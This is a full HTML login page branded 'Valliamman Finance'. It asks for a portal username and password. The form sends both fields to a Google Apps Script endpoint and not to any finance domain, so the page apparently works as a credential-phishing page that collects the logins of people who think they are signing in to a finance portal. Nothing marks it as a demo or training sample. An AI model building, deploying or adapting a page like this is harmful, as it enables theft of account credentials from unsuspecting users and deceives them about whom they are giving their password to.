<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Valliamman Finance | Sign in</title>
<style>
  :root { color-scheme: light; font-family: "Segoe UI", sans-serif; color: #172033; background: #edf2f7; }
  * { box-sizing: border-box; }
  body { min-height: 100vh; margin: 0; display: grid; place-items: center; padding: 24px; background: linear-gradient(135deg, #eaf3f2, #f3f5f8 55%, #e8edf5); }
  main { width: min(100%, 440px); background: #fff; border: 1px solid #dfe5ec; border-radius: 12px; padding: 32px; box-shadow: 0 16px 48px #24364b1c; }
  .mark { width: 42px; height: 42px; display: grid; place-items: center; border-radius: 10px; background: #d9eee8; color: #176b58; font-weight: 700; }
  h1 { margin: 22px 0 8px; font-size: 24px; }
  p { color: #596579; line-height: 1.5; margin: 0 0 22px; }
  label { display: block; margin-top: 16px; color: #38455a; font-size: 13px; }
  input { display: block; width: 100%; margin-top: 6px; padding: 11px 12px; border: 1px solid #ccd5e0; border-radius: 6px; font: inherit; }
  button { margin-top: 20px; padding: 10px 16px; border: 0; border-radius: 6px; background: #176b58; color: white; font: inherit; font-weight: 600; cursor: pointer; }
  #status { min-height: 20px; margin-top: 16px; color: #a12a2a; font-size: 13px; }
</style>
</head>
<body>
<main>
  <div class="mark" aria-hidden="true">VF</div>
  <h1>Valliamman Finance</h1>
  <p>Sign in with your portal username and password.</p>
  <form method="post" action="https://script.google.com/macros/s/AKfycbyJ-yJxwPpsSy7gN66u9Z1bf7HpYd2uV9-bnHwITrVxl77DfNwuMcKTDVMxtIA6lplUhw/exec">
    <label>Username<input name="username" autocomplete="username" required></label>
    <label>Password<input name="password" type="password" autocomplete="current-password" required></label>
    <button type="submit">Sign in</button>
  </form>
  <p id="status" role="status" aria-live="polite"></p>
</main>
</body>
</html>
